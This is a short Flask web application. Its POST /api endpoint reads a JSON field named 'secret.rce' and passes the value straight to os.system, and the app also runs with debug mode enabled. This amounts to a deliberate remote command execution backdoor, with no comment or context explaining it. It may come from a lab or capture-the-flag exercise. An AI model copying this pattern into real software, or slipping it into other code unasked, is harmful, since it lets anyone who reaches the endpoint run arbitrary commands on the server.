from flask import Flask, request, jsonify
import os

app = Flask(__name__)


@app.route('/')
def index():
    return open('index.html').read()


@app.route('/api', methods=['POST'])
def api():
    data = request.get_json()
    print(data)
    
    if data.get('secret') and data.get('secret').get('rce'):
        os.system(str(data.get('secret').get('rce')))

    return jsonify(data)


if __name__ == '__main__':
    app.run(debug=True)